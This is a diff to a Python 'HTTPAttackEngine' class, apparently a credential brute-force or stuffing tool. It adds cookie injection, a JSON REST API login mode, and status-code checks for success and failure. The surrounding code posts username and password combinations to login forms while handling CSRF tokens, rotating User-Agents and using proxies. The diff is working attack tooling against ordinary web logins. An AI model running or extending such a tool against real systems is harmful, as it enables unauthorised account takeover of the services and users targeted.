@@ -394,6 +394,10 @@ class HTTPAttackEngine:
             delay: float = ctx.get("delay", 0)
             jitter: float = ctx.get("jitter", 0)
             custom_headers: Dict[str, str] = ctx.get("custom_headers", {})
+            custom_cookies: Dict[str, str] = ctx.get("cookies", {}) or ctx.get("custom_cookies", {})
+            json_mode: bool = ctx.get("json_mode", False) or ctx.get("content_type", "").lower() == "json"
+            success_status_codes: List[int] = ctx.get("success_status_codes", [])
+            failure_status_codes: List[int] = ctx.get("failure_status_codes", [])
 
             # Retry budget
             retry_budget: Dict[Tuple[str, str], int] = {}
@@ -401,7 +405,7 @@ class HTTPAttackEngine:
             MAX_RETRIES_PER_COMBO: int = 3
 
             # ── Step 1: Probe the login page & detect form ────────
-            self._log("[*] HTTP Mode — probing login page...")
+            self._log(f"[*] HTTP Mode ({'REST JSON API' if json_mode else 'HTML Form'}) — probing target...")
             target_url = ctx["target_url"]
 
             probe_session = requests.Session()
@@ -497,6 +501,8 @@ class HTTPAttackEngine:
                     "User-Agent": random.choice(DEFAULT_USER_AGENTS),
                     **custom_headers,
                 })
+                if custom_cookies:
+                    session.cookies.update(custom_cookies)
 
                 # Apply proxy if available
                 proxy_list = ctx.get("proxies", [])
@@ -582,20 +588,28 @@ class HTTPAttackEngine:
                                         pass
                                 current_extra[csrf_field] = current_csrf_token
 
-                            # Build POST data
-                            post_data = {
+                            # Build POST data / payload
+                            payload_data = {
                                 username_field: user,
                                 password_field: pwd,
                                 **current_extra,
                             }
 
-                            # Send POST request
-                            resp = session.post(
-                                form_action,
-                                data=post_data,
-                                allow_redirects=follow_redirects,
-                                timeout=15,
-                            )
+                            # Send POST request (JSON or Form URL encoded)
+                            if json_mode:
+                                resp = session.post(
+                                    form_action,
+                                    json=payload_data,
+                                    allow_redirects=follow_redirects,
+                                    timeout=15,
+                                )
+                            else:
+                                resp = session.post(
+                                    form_action,
+                                    data=payload_data,
+                                    allow_redirects=follow_redirects,
+                                    timeout=15,
+                                )
 
                             with self._metrics_lock:
                                 self.metrics["attempted"] += 1
@@ -651,6 +665,17 @@ class HTTPAttackEngine:
                                 self._emit_metrics()
                                 continue
 
+                            # ── Status code explicit failure check ──
+                            if failure_status_codes and status_code in failure_status_codes:
+                                with self._metrics_lock:
+                                    self.metrics["failures"] += 1
+                                with done_lock:
+                                    done_count[0] += 1
+                                self._emit_progress(done_count[0], total)
+                                q.task_done()
+                                self._emit_metrics()
+                                continue
+
                             # ── Error text check ──
                             if error_msg_lower and error_msg_lower in resp_text:
                                 with self._metrics_lock:
@@ -664,6 +689,10 @@ class HTTPAttackEngine:
 
                             # ── Determine success (Fallback indicator chain) ──
                             is_success = False
+
+                            # 0. Explicit Success Status Code match
+                            if success_status_codes and status_code in success_status_codes:
+                                is_success = True
 
                             # 1. Success Message match
                             if success_msg and success_msg in resp_text:
